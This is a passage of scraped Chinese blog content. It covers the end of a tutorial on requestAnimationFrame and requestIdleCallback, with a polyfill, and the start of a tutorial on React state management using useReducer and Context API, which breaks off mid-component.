  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"data-processor"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数据处理状态<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>状态：{status}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>已处理数据：{processedCount}/5000<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"progress-bar"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
          <span class="hljs-attr">className</span>=<span class="hljs-string">"progress-fill"</span> 
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> `${(<span class="hljs-attr">processedCount</span> / <span class="hljs-attr">5000</span>) * <span class="hljs-attr">100</span>}%` }}
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<h3 data-id="heading-13">⚠️ 注意事项</h3>
<h4 data-id="heading-14">1. 浏览器兼容性</h4>
<ul>
<li><code>requestAnimationFrame</code>：支持所有现代浏览器，IE10+可用</li>
<li><code>requestIdleCallback</code>：支持Chrome 47+、Firefox 55+、Edge 79+，Safari不支持</li>
</ul>
<p><strong>解决方案</strong>：使用polyfill</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// requestIdleCallback polyfill</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">window</span>.<span class="hljs-property">requestIdleCallback</span>) {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">requestIdleCallback</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">callback, options</span>) {
    <span class="hljs-keyword">const</span> timeout = options &amp;&amp; options.<span class="hljs-property">timeout</span> || <span class="hljs-number">1000</span>;
    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">callback</span>({
        <span class="hljs-attr">didTimeout</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">timeRemaining</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, timeout - (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start));
        }
      });
    }, <span class="hljs-number">1</span>);
  };
  
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">cancelIdleCallback</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">id</span>) {
    <span class="hljs-built_in">clearTimeout</span>(id);
  };
}
</code></pre>
<h4 data-id="heading-15">2. 优先级管理</h4>
<ul>
<li>不要在<code>requestIdleCallback</code>中执行高优先级任务（如用户交互、动画）</li>
<li>对于紧急任务，使用<code>requestAnimationFrame</code>或直接执行</li>
<li>使用<code>requestIdleCallback</code>的<code>timeout</code>选项确保任务最终会被执行</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 设置timeout确保任务在2秒内执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(handleLowPriorityTask, { <span class="hljs-attr">timeout</span>: <span class="hljs-number">2000</span> });
</code></pre>
<h4 data-id="heading-16">3. 性能监控</h4>
<ul>
<li>使用浏览器开发者工具（如Chrome DevTools的Performance面板）监控页面性能</li>
<li>分析帧率（FPS）和主线程阻塞情况</li>
<li>识别需要优化的任务</li>
</ul>
<h4 data-id="heading-17">4. 避免滥用</h4>
<ul>
<li>不要将所有任务都放入<code>requestAnimationFrame</code>或<code>requestIdleCallback</code>中</li>
<li>只有在确实需要优化性能时才使用这些API</li>
<li>对于简单任务，直接执行可能更高效</li>
</ul>
<h3 data-id="heading-18">📝 总结</h3>
<p><code>requestAnimationFrame</code>和<code>requestIdleCallback</code>是浏览器提供的两个强大的性能优化API，它们可以帮助我们更合理地安排任务执行时间，避免阻塞主线程。</p>
<p><strong>requestAnimationFrame</strong>：</p>
<ul>
<li>用于高优先级、与渲染相关的任务</li>
<li>在下一次浏览器重绘之前执行</li>
<li>适用于动画效果和需要与渲染同步的任务</li>
</ul>
<p><strong>requestIdleCallback</strong>：</p>
<ul>
<li>用于低优先级、非紧急任务</li>
<li>在浏览器空闲时间执行</li>
<li>适用于批量处理和后台任务</li>
</ul>
<p>通过合理使用这两个API，我们可以显著提升页面的流畅度和响应速度，为用户提供更好的体验。</p>
<p>希望这个小技巧对你有所帮助！如果你有任何问题或建议，欢迎在评论区留言讨论 🤗</p>
<hr/>
<p><strong>相关资源：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWindow%2FrequestAnimationFrame" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame" ref="nofollow noopener noreferrer">MDN - requestAnimationFrame</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWindow%2FrequestIdleCallback" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestIdleCallback" ref="nofollow noopener noreferrer">MDN - requestIdleCallback</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fweb.dev%2Farticles%2Fanimations-guide" target="_blank" title="https://web.dev/articles/animations-guide" ref="nofollow noopener noreferrer">Web.dev - 优化动画性能</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fweb%2Fupdates%2F2015%2F08%2Fusing-requestidlecallback" target="_blank" title="https://developers.google.com/web/updates/2015/08/using-requestidlecallback" ref="nofollow noopener noreferrer">Google Developers - 使用requestIdleCallback</a></li>
</ul>
<p><strong>标签：</strong> #前端性能优化 #requestAnimationFrame #requestIdleCallback #JavaScript性能 #React性能优化</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React轻量级状态管理方案（useReducer + Context API）]]></title>    <link>https://juejin.cn/post/7581324707480584233</link>    <guid>https://juejin.cn/post/7581324707480584233</guid>    <pubDate>2025-12-09T01:48:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581324707480584233" data-draft-id="7581324707480567849" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React轻量级状态管理方案（useReducer + Context API）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T01:48:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dorisrv"/> <meta itemprop="url" content="https://juejin.cn/user/1522178380270712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React轻量级状态管理方案（useReducer + Context API）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1522178380270712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dorisrv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T01:48:50.000Z" title="Tue Dec 09 2025 01:48:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React轻量级状态管理方案（useReducer + Context API）</h2>
<h3 data-id="heading-1">🤔 为什么需要轻量级状态管理？</h3>
<p>在React应用开发中，随着组件层次的增加和状态复杂度的提升，传统的props传递方式会变得越来越繁琐：</p>
<ul>
<li>多层级组件需要通过props逐层传递数据（props drilling）</li>
<li>多个组件共享同一份状态时，状态同步变得困难</li>
<li>组件间通信需要通过复杂的回调函数</li>
<li>大型状态管理库（如Redux）可能带来不必要的复杂性</li>
</ul>
<p>对于中等规模的应用，我们可以使用React内置的<code>useReducer</code>和<code>Context API</code>组合，实现一个轻量级、高效的状态管理方案，既避免了props drilling，又不需要引入额外的依赖。</p>
<h3 data-id="heading-2">💡 基础概念</h3>
<h4 data-id="heading-3">1. useReducer Hook</h4>
<p><code>useReducer</code>是React提供的一个Hook，用于管理复杂的状态逻辑。它类似于Redux的思想：</p>
<ul>
<li>状态通过<code>reducer</code>函数进行更新</li>
<li>状态更新需要派发（dispatch）一个动作（action）</li>
<li><code>reducer</code>函数接收当前状态和动作，返回新的状态</li>
</ul>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState);
</code></pre>
<h4 data-id="heading-4">2. Context API</h4>
<p><code>Context API</code>是React提供的一种在组件树中共享数据的方式，不需要通过props逐层传递：</p>
<ul>
<li>使用<code>createContext</code>创建一个Context对象</li>
<li>使用<code>Provider</code>组件包裹需要共享数据的组件树</li>
<li>使用<code>useContext</code>在子组件中获取共享数据</li>
</ul>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建Context</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">MyContext</span> = <span class="hljs-title function_">createContext</span>(defaultValue);

<span class="hljs-comment">// 提供Context</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>&gt;</span>
  {/* 子组件 */}
<span class="hljs-tag">&lt;/<span class="hljs-name">MyContext.Provider</span>&gt;</span></span>

<span class="hljs-comment">// 消费Context</span>
<span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">MyContext</span>);
</code></pre>
<h3 data-id="heading-5">🚀 基础实现：计数器应用</h3>
<p>让我们先通过一个简单的计数器应用，了解<code>useReducer</code>和<code>Context API</code>的基础用法。</p>
<h4 data-id="heading-6">1. 创建状态管理文件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/contexts/CounterContext.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { createContext, useContext, useReducer } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// 定义初始状态</span>
<span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">history</span>: [<span class="hljs-number">0</span>],
  <span class="hljs-attr">isUndoDisabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">isRedoDisabled</span>: <span class="hljs-literal">true</span>
};

<span class="hljs-comment">// 定义action类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ActionTypes</span> = {
  <span class="hljs-attr">INCREMENT</span>: <span class="hljs-string">'INCREMENT'</span>,
  <span class="hljs-attr">DECREMENT</span>: <span class="hljs-string">'DECREMENT'</span>,
  <span class="hljs-attr">RESET</span>: <span class="hljs-string">'RESET'</span>,
  <span class="hljs-attr">UNDO</span>: <span class="hljs-string">'UNDO'</span>,
  <span class="hljs-attr">REDO</span>: <span class="hljs-string">'REDO'</span>,
  <span class="hljs-attr">SET_COUNT</span>: <span class="hljs-string">'SET_COUNT'</span>
};

<span class="hljs-comment">// 创建reducer函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">counterReducer</span> = (<span class="hljs-params">state, action</span>) =&gt; {
  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">INCREMENT</span>:
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span>,
        <span class="hljs-attr">history</span>: [...state.<span class="hljs-property">history</span>, state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span>],
        <span class="hljs-attr">currentIndex</span>: state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span>,
        <span class="hljs-attr">isUndoDisabled</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">isRedoDisabled</span>: <span class="hljs-literal">true</span>
      };
      
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">DECREMENT</span>:
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span>,
        <span class="hljs-attr">history</span>: [...state.<span class="hljs-property">history</span>, state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span>],
        <span class="hljs-attr">currentIndex</span>: state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span>,
        <span class="hljs-attr">isUndoDisabled</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">isRedoDisabled</span>: <span class="hljs-literal">true</span>
      };
      
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">RESET</span>:
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">history</span>: [...state.<span class="hljs-property">history</span>, <span class="hljs-number">0</span>],
        <span class="hljs-attr">currentIndex</span>: state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span>,
        <span class="hljs-attr">isUndoDisabled</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">isRedoDisabled</span>: <span class="hljs-literal">true</span>
      };
      
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">UNDO</span>:
      <span class="hljs-keyword">if</span> (state.<span class="hljs-property">currentIndex</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> state;
      <span class="hljs-keyword">const</span> newIndex = state.<span class="hljs-property">currentIndex</span> - <span class="hljs-number">1</span>;
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">count</span>: state.<span class="hljs-property">history</span>[newIndex],
        <span class="hljs-attr">currentIndex</span>: newIndex,
        <span class="hljs-attr">isUndoDisabled</span>: newIndex === <span class="hljs-number">0</span>,
        <span class="hljs-attr">isRedoDisabled</span>: <span class="hljs-literal">false</span>
      };
      
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">REDO</span>:
      <span class="hljs-keyword">if</span> (state.<span class="hljs-property">currentIndex</span> &gt;= state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> state;
      <span class="hljs-keyword">const</span> nextIndex = state.<span class="hljs-property">currentIndex</span> + <span class="hljs-number">1</span>;
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">count</span>: state.<span class="hljs-property">history</span>[nextIndex],
        <span class="hljs-attr">currentIndex</span>: nextIndex,
        <span class="hljs-attr">isUndoDisabled</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">isRedoDisabled</span>: nextIndex === state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>
      };
      
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">SET_COUNT</span>:
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">count</span>: action.<span class="hljs-property">payload</span>,
        <span class="hljs-attr">history</span>: [...state.<span class="hljs-property">history</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, state.<span class="hljs-property">currentIndex</span> + <span class="hljs-number">1</span>), action.<span class="hljs-property">payload</span>],
        <span class="hljs-attr">currentIndex</span>: state.<span class="hljs-property">currentIndex</span> + <span class="hljs-number">1</span>,
        <span class="hljs-attr">isUndoDisabled</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">isRedoDisabled</span>: <span class="hljs-literal">true</span>
      };
      
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> state;
  }
};

<span class="hljs-comment">// 创建Context</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">CounterContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// 创建Provider组件</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">CounterProvider</span> = (<span class="hljs-params">{ children }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(counterReducer, initialState);
  
  <span class="hljs-comment">// 定义操作函数</span>
  <span class="hljs-keyword">const</span> actions = {
    <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">INCREMENT</span> }),
    <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">DECREMENT</span> }),
    <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">RESET</span> }),
    <span class="hljs-attr">undo</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">UNDO</span> }),
    <span class="hljs-attr">redo</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">REDO</span> }),
    <span class="hljs-attr">setCount</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">SET_COUNT</span>, <span class="hljs-attr">payload</span>: value })
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">CounterContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">state</span>, <span class="hljs-attr">...actions</span> }}&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">CounterContext.Provider</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// 创建自定义Hook，方便在组件中使用</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useCounter</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CounterContext</span>);
  <span class="hljs-keyword">if</span> (!context) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'useCounter must be used within a CounterProvider'</span>);
  }
  <span class="hljs-keyword">return</span> context;
};
</code></pre>
<h4 data-id="heading-7">2. 在应用中使用Provider</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/App.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CounterProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./contexts/CounterContext'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">CounterDisplay</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/CounterDisplay'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">CounterControls</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/CounterControls'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">CounterHistory</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/CounterHistory'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">CounterProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"app"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>React 轻量级状态管理示例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">CounterDisplay</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">CounterControls</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">CounterHistory</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">CounterProvider</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<h4 data-id="heading-8">3. 创建消费组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/components/CounterDisplay.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useCounter } <span class="hljs-keyword">from</span> <span class="hljs-string">'../contexts/CounterContext'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">CounterDisplay</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { state } = <span class="hljs-title function_">useCounter</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"counter-display"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前计数：<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"count-value"</span>&gt;</span>{state.count}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterDisplay</span>;

<span class="hljs-comment">// src/components/CounterControls.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useCounter } <span class="hljs-keyword">from</span> <span class="hljs-string">'../contexts/CounterContext'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">CounterControls</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { increment, decrement, reset, undo, redo, state } = <span class="hljs-title function_">useCounter</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"counter-controls"</span>&gt;</span>
